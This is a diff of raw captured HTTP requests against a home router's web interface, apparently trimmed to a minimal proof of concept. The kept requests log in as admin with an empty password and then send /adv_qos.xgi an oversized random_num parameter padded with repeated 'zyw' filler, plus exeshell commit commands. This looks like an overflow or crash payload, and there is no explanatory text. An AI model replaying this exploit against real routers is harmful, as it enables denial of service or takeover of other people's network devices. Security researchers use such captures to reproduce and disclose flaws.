@@ -1,27 +1,4 @@
-GET / HTTP/1.1
-Host: 192.168.0.1
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
-Sec-Purpose: prefetch;prerender
-Purpose: prefetch
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-GET /index.php HTTP/1.1
-Host: 192.168.0.1
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
-Sec-Purpose: prefetch;prerender
-Purpose: prefetch
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.0.1/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-POST /login.php HTTP/1.1
+POST /login.php HTTP/1.1
 Host: 192.168.0.1
 Connection: keep-alive
 Content-Length: 63
@@ -35,60 +12,13 @@ Referer: http://192.168.0.1/index.php
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 
-ACTION_POST=LOGIN&LOGIN_USER=admin&LOGIN_PASSWD=&login=+Log+In+GET /pic/wan_on.jpg HTTP/1.1
-Host: 192.168.0.1
-Connection: keep-alive
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
-Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
-Referer: http://192.168.0.1/bsc_internet.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-GET /pic/wan_off.jpg HTTP/1.1
-Host: 192.168.0.1
-Connection: keep-alive
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
-Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
-Referer: http://192.168.0.1/bsc_internet.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-GET /model/__ajax_wan_conninfo.php?r=2025.5.22.15.46.53 HTTP/1.1
-Host: 192.168.0.1
-Connection: keep-alive
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
-Accept: */*
-Referer: http://192.168.0.1/adv_qos.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-GET /adv_qos.xgi?random_num=2025.5.22.15.46zywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzydzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywz„wzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywYywzywzywzywzywzywzywzywzywzywzzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzqwzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywz@wzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzyzywzywzywzywzywzywzywzywzywzywzywzywzywzyw.56&exeshell=submit%20COMMIT&exeshell=submit%20QOS HTTP/1.1
+ACTION_POST=LOGIN&LOGIN_USER=admin&LOGIN_PASSWD=&login=+Log+In+GET /adv_qos.xgi?random_num=2025.5.22.15.46zywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzydzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzï¿½wzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywYywzywzywzywzywzywzywzywzywzywzzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzqwzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywz@wzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzywzyzywzywzywzywzywzywzywzywzywzywzywzywzywzyw.56&exeshell=submit%20COMMIT&exeshell=submit%20QOS HTTP/1.1
 Host: 192.168.0.1
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://192.168.0.1/adv_qos.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-GET /adv_qos.php?uptime=51&random_num=2025.5.22.15.46.56 HTTP/1.1
-Host: 192.168.0.1
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.0.1/adv_qos.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-
-GET /adv_app.php HTTP/1.1
-Host: 192.168.0.1
-Connection: keep-alive
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://192.168.0.1/adv_qos.php?uptime=51&random_num=2025.5.22.15.46.56
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 
